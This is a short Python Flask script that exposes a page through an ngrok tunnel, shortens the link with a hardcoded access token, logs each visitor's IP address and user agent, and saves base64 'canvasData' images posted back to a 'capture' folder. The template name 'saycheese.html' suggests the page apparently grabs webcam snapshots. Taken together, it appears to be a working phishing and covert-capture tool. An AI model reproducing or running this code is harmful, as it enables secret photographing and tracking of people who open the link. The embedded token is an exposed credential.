from flask import Flask , render_template , request
import threading
import base64
from pyngrok import ngrok
import logging
import pyshorteners
import requests
import os
from datetime import datetime

try:
    #access token
    ACCESS_TOKEN = "4502b7025553b70c1f8681d6827a63960ee48fb9"
    shortener = pyshorteners.Shortener(api_key=ACCESS_TOKEN)

    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    os.environ["FLASK_ENV"] = "development"
    app = Flask(__name__)
    app.debug = False
    port = 5000
    public_url = ngrok.connect(port).public_url
    final_url = public_url[:4] + "s" + public_url[4:]

    print("LINK ====> " , final_url)
    app.config["BASE_URL"] = public_url

    @app.route("/" , methods = ['POST' , 'GET'])

    def home():

        if request.method == "GET":
            req = requests.get('http://localhost:4040/api/requests/http').json()
            user_agent = req['requests'][0]['request']['headers']['User-Agent'][0]
            ip_address = req['requests'][0]['request']['headers']['X-Forwarded-For'][0]

            print(f"\n IP ADDRESS : {ip_address}" , f"USER-AGENT : {user_agent}")

        elif request.method == "POST":
            now = str(datetime.now())
            save_path = 'capture'
            file_name = 'img_'+now+'.png'
            complatreName = os.path.join(save_path , file_name)

            req_data = request.get_json()
            encoded = req_data['canvasData']

            file2 = open(complatreName , "wb")
            data = base64.b64decode(encoded)
            file2.write(data)
            file2.close()
            print("IMAGE OK")
        return render_template('saycheese.html')

    threading.Thread(target=app.run , kwargs={"use_reloader" : False}).start()

except KeyboardInterrupt:
    print("FINISHED.../")